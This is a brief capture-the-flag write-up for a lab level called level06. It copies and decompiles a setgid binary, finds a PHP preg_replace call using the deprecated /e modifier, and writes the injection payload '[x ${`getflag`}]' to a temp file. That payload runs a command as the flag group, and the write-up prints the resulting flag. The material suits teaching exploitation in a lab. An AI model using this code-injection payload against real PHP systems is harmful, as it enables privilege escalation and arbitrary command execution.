# level06

```shell
ls -la
```

shows that the level06 executable belongs to flag06 group, privilege escalation should be possible

```shell
scp -P 4242 level06@127.0.0.1:/home/user/level06/level06 .
```

```shell
/opt/retdec/bin/retdec-decompiler.py level06
```

setresgid confirms that privilege escalation is possible

```shell
cat levelo6.php
```

shows deprecated `\e` regex modifier, which indicates we can inject code in the string. preg_replace will perform the regex substitution then evaluate the code

```shell
echo '[x ${`getflag`}]' > /tmp/exploit.php
```

```shell
./level06
```

gives flag:

```shell
wiok45aaoguiboiki2tuin6ub
```
